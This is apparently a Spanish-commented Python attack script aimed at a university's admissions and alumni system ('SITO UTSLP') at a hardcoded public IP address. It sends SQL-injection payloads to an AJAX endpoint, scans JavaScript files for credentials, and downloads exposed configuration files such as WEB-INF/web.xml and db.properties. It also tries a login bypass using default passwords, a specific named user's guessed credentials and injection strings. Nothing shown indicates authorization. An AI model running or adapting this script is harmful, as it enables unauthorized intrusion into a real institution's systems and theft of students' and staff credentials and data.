#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ANÁLISIS REAL SITO UTSLP - ENFOQUE PRÁCTICO
Basado en resultados reales: SQL Injection NO funciona, pero hay endpoints accesibles
"""

import requests
import re
import json
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

disable_warnings(InsecureRequestWarning)

class SITOAnalyzer:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.verify = False
        self.base_url = f"http://{target}"
        
    def analyze_real_vulnerabilities(self):
        """Analiza lo que REALMENTE funciona"""
        print("="*80)
        print("ANÁLISIS REAL DE VULNERABILIDADES SITO UTSLP")
        print("="*80)
        
        # 1. Endpoints que SABEMOS que funcionan
        self.test_working_endpoints()
        
        # 2. Análisis de JavaScript para credenciales
        self.analyze_javascript_files()
        
        # 3. Explotar endpoints AJAX funcionales
        self.exploit_functional_ajax()
        
        # 4. Buscar archivos REALMENTE accesibles
        self.find_accessible_files()
        
        # 5. Análisis de parámetros ocultos
        self.analyze_hidden_parameters()

    def test_working_endpoints(self):
        """Prueba endpoints que sabemos que funcionan"""
        print("\n[1] ENDPOINTS CONFIRMADOS:")
        
        working_endpoints = [
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=N",
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=D", 
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=Z",
            "/jsp/escolar/proceso_admision_lic/proceso_interesado.jsp",
            "/jsp/seguimiento_egreso/proceso_registro_egresado.jsp?xNuevo=1",
            "/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=1",
            "/jsp/escolar/muestra_bachillerato_ajax.jsp?xCveBachillerato=1"
        ]
        
        for endpoint in working_endpoints:
            url = self.base_url + endpoint
            try:
                r = self.session.get(url, timeout=10)
                print(f"✅ {endpoint} - {r.status_code} ({len(r.text)} bytes)")
                
                # Guardar para análisis
                filename = f"working_{endpoint.replace('/','_').replace('?','_')}.html"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(r.text)
                    
            except Exception as e:
                print(f"❌ {endpoint} - Error: {e}")

    def analyze_javascript_files(self):
        """Analiza archivos JavaScript para encontrar credenciales"""
        print("\n[2] ANALIZANDO ARCHIVOS JAVASCRIPT:")
        
        js_files = [
            "/javascript/utilities.js",
            "/javascript/jquery/jquery-1.5.1.min.js", 
            "/javascript/jquery/jquery-ui-1.8.2.min.js",
            "/javascript/scriptAnimaciones.js"
        ]
        
        for js_file in js_files:
            url = self.base_url + js_file
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    print(f"📜 {js_file} - Encontrado")
                    
                    # Buscar patrones interesantes
                    patterns = {
                        'urls': r'https?://[^\s"\'<>]+',
                        'emails': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
                        'credentials': r'(password|pwd|user|username)[\s:=]+[\'"]([^\'"]+)[\'"]',
                        'api_endpoints': r'/(ajax|api|json|data)[^\s"\'<>]*',
                    }
                    
                    for pattern_name, pattern in patterns.items():
                        matches = re.findall(pattern, r.text, re.IGNORECASE)
                        if matches:
                            print(f"   🔍 {pattern_name}: {matches[:3]}")
                            
            except Exception as e:
                print(f"❌ {js_file} - Error: {e}")

    def exploit_functional_ajax(self):
        """Explota endpoints AJAX que SABEMOS que funcionan"""
        print("\n[3] EXPLOTANDO ENDPOINTS AJAX FUNCIONALES:")
        
        # Endpoint que sabemos que devuelve datos reales
        ajax_url = self.base_url + "/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp"
        
        # Probar diferentes valores
        test_values = [
            "1", "2", "3", "10", "100",
            "1'", "1' OR '1'='1", "1' UNION SELECT 1,2,3--",
            "0", "-1", "9999"
        ]
        
        for value in test_values:
            try:
                url = f"{ajax_url}?xCveBachillerato={value}"
                r = self.session.get(url, timeout=5)
                
                if r.status_code == 200 and len(r.text.strip()) > 5:
                    print(f"📊 xCveBachillerato={value} -> {r.text.strip()}")
                    
                    # Buscar patrones de error o datos
                    if "error" in r.text.lower() or "exception" in r.text.lower():
                        print(f"   ⚠️  Posible error con valor: {value}")
                        
            except Exception as e:
                print(f"❌ Error con {value}: {e}")

    def find_accessible_files(self):
        """Busca archivos REALMENTE accesibles (no mediante traversal)"""
        print("\n[4] BUSCANDO ARCHIVOS DIRECTAMENTE ACCESIBLES:")
        
        # Archivos que podrían estar expuestos
        exposed_files = [
            "/robots.txt",
            "/.htaccess",
            "/web.xml",
            "/config.xml",
            "/db.properties",
            "/database.properties",
            "/config/database.php",
            "/inc/config.php",
            "/WEB-INF/web.xml",
            "/META-INF/context.xml",
            "/javascript/config.js",
            "/css/config.css",
            "/images/",
            "/docs/",
            "/examples/",
            "/manager/html",
            "/host-manager/html"
        ]
        
        for file_path in exposed_files:
            url = self.base_url + file_path
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    print(f"📁 {file_path} - ACCESIBLE ({len(r.content)} bytes)")
                    
                    # Guardar archivo encontrado
                    filename = f"exposed_{file_path.replace('/','_')}"
                    with open(filename, 'wb') as f:
                        f.write(r.content)
                        
                    # Analizar contenido si es texto
                    if b'text' in r.headers.get('content-type', b'').lower():
                        content = r.text[:500]  # Primeros 500 caracteres
                        print(f"   Contenido: {content}")
                        
            except Exception as e:
                print(f"❌ {file_path} - Error: {e}")

    def analyze_hidden_parameters(self):
        """Analiza parámetros ocultos en formularios funcionales"""
        print("\n[5] ANALIZANDO PARÁMETROS OCULTOS:")
        
        # Formularios que sabemos que existen
        forms_to_analyze = [
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=N",
            "/jsp/seguimiento_egreso/proceso_registro_egresado.jsp?xNuevo=1"
        ]
        
        for form_url in forms_to_analyze:
            url = self.base_url + form_url
            try:
                r = self.session.get(url, timeout=5)
                
                # Extraer todos los inputs hidden
                hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', r.text)
                
                if hidden_inputs:
                    print(f"📋 Formulario: {form_url}")
                    for input_tag in hidden_inputs[:5]:  # Mostrar solo primeros 5
                        # Extraer name y value
                        name_match = re.search(r'name=["\']([^"\']+)["\']', input_tag)
                        value_match = re.search(r'value=["\']([^"\']*)["\']', input_tag)
                        
                        name = name_match.group(1) if name_match else "sin nombre"
                        value = value_match.group(1) if value_match else "sin valor"
                        
                        print(f"   🔒 {name} = {value}")
                        
            except Exception as e:
                print(f"❌ Error analizando {form_url}: {e}")

    def test_authentication_bypass(self):
        """Prueba bypass de autenticación REAL"""
        print("\n[6] PROBANDO BYPASS DE AUTENTICACIÓN:")
        
        login_url = self.base_url + "/jsp/index.jsp"
        
        # Enfoques más realistas
        bypass_attempts = [
            # Método 1: Credenciales por defecto
            {'yUsuario': 'admin', 'xUsuario': 'admin', 'xContrasena': 'admin'},
            {'yUsuario': 'hnieto', 'xUsuario': 'hnieto', 'xContrasena': 'utslp'},
            {'yUsuario': 'test', 'xUsuario': 'test', 'xContrasena': 'test'},
            
            # Método 2: Campos vacíos
            {'yUsuario': '', 'xUsuario': '', 'xContrasena': ''},
            {'yUsuario': 'admin', 'xUsuario': 'admin', 'xContrasena': ''},
            
            # Método 3: Inyecciones simples
            {'yUsuario': "' OR '1'='1'--", 'xUsuario': 'test', 'xContrasena': 'test'},
            {'yUsuario': 'admin', 'xUsuario': "' OR 1=1--", 'xContrasena': 'test'},
        ]
        
        for i, attempt in enumerate(bypass_attempts):
            data = {
                'yAccion': 'login',
                'yIntentos': '1',
                **attempt
            }
            
            try:
                r = self.session.post(login_url, data=data, timeout=10)
                
                # Indicadores REALES de éxito (no falsos positivos)
                success_indicators = [
                    'location.replace' in r.text,  # Redirección
                    'menu_principal' in r.text,    # Menú principal
                    'Bienvenido' in r.text,        # Mensaje de bienvenida
                    'admin' in r.text.lower(),     # Área admin
                    len(r.text) < 1000,           # Página más corta (redirección)
                ]
                
                if any(success_indicators):
                    print(f"🎯 POSIBLE BYPASS EXITOSO (Intento {i+1})")
                    print(f"   Credenciales: {attempt}")
                    print(f"   Indicadores: {[ind for ind in success_indicators if True]}")
                    
                    # Guardar respuesta
                    with open(f"bypass_attempt_{i+1}.html", 'w', encoding='utf-8') as f:
                        f.write(r.text)
                        
            except Exception as e:
                print(f"❌ Error en intento {i+1}: {e}")

# Ejecutar análisis
if __name__ == "__main__":
    target = "189.254.143.102"
    analyzer = SITOAnalyzer(target)
    analyzer.analyze_real_vulnerabilities()
    analyzer.test_authentication_bypass()